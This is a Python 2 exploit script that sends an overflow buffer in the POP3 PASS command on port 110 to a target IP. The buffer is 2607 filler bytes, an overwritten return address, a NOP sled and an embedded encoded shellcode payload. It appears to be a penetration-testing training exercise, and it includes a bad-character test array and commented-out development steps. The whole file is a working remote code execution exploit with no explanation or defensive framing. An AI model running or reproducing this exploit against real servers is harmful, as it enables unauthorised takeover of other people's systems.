#!/usr/bin/python
import socket
import sys
import time

# Create an array of buffers, from 1 to 5900, with increments of 200.

# string=open('pattern.txt','r').read()
#string = 'A'*2607 + 'B'*4 + 'C'*(3500-2607-4)
#shellcode = open('shellcode','r').read()
#shellcode = (shellcode)

shellcode = (
"\xbe\x53\xa8\xc8\x97\xdd\xc1\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x70\x0e\x03\x23\xa6\x2a\x62\x3f\x5e\x28"
"\x8d\xbf\x9f\x4d\x07\x5a\xae\x4d\x73\x2f\x81\x7d\xf7\x7d\x2e"
"\xf5\x55\x95\xa5\x7b\x72\x9a\x0e\x31\xa4\x95\x8f\x6a\x94\xb4"
"\x13\x71\xc9\x16\x2d\xba\x1c\x57\x6a\xa7\xed\x05\x23\xa3\x40"
"\xb9\x40\xf9\x58\x32\x1a\xef\xd8\xa7\xeb\x0e\xc8\x76\x67\x49"
"\xca\x79\xa4\xe1\x43\x61\xa9\xcc\x1a\x1a\x19\xba\x9c\xca\x53"
"\x43\x32\x33\x5c\xb6\x4a\x74\x5b\x29\x39\x8c\x9f\xd4\x3a\x4b"
"\xdd\x02\xce\x4f\x45\xc0\x68\xab\x77\x05\xee\x38\x7b\xe2\x64"
"\x66\x98\xf5\xa9\x1d\xa4\x7e\x4c\xf1\x2c\xc4\x6b\xd5\x75\x9e"
"\x12\x4c\xd0\x71\x2a\x8e\xbb\x2e\x8e\xc5\x56\x3a\xa3\x84\x3e"
"\x8f\x8e\x36\xbf\x87\x99\x45\x8d\x08\x32\xc1\xbd\xc1\x9c\x16"
"\xc1\xfb\x59\x88\x3c\x04\x9a\x81\xfa\x50\xca\xb9\x2b\xd9\x81"
"\x39\xd3\x0c\x05\x69\x7b\xff\xe6\xd9\x3b\xaf\x8e\x33\xb4\x90"
"\xaf\x3c\x1e\xb9\x5a\xc7\xc9\xcc\x91\xc7\x6e\xb9\xa7\xc7\x71"
"\x82\x21\x21\x1b\xe4\x67\xfa\xb4\x9d\x2d\x70\x24\x61\xf8\xfd"
"\x66\xe9\x0f\x02\x28\x1a\x65\x10\xdd\xea\x30\x4a\x48\xf4\xee"
"\xe2\x16\x67\x75\xf2\x51\x94\x22\xa5\x36\x6a\x3b\x23\xab\xd5"
"\x95\x51\x36\x83\xde\xd1\xed\x70\xe0\xd8\x60\xcc\xc6\xca\xbc"
"\xcd\x42\xbe\x10\x98\x1c\x68\xd7\x72\xef\xc2\x81\x29\xb9\x82"
"\x54\x02\x7a\xd4\x58\x4f\x0c\x38\xe8\x26\x49\x47\xc5\xae\x5d"
"\x30\x3b\x4f\xa1\xeb\xff\x7f\xe8\xb1\x56\xe8\xb5\x20\xeb\x75"
"\x46\x9f\x28\x80\xc5\x15\xd1\x77\xd5\x5c\xd4\x3c\x51\x8d\xa4"
"\x2d\x34\xb1\x1b\x4d\x1d" )

badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

discovered = "\x0a\0x0d\0x00"


esp_add = "\x8f\x35\x4a\x5f" 
string = 'A'*2607 + esp_add + "\x90"*8 + shellcode
print (string) 
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print "\nSending evil buffer..."
	print string
	s.connect((sys.argv[1],110)) # connect to IP, POP3 port
	data = s.recv(1024) # receive banner
	print data # print banner
	s.send('USER test' +'\r\n') # send username "test"
	data = s.recv(1024) # receive reply
	print data # print reply
	s.send('PASS' + string + '\r\n') # send password "test"
	data = s.recv(1024) # receive reply
	print data # print reply
	s.send('QUIT\r\n')
	s.close() # close socket
	print "\nDone!"
	time.sleep(3)
except Exception as e:  
	print(e)	 
	print "Could not connect to POP3!"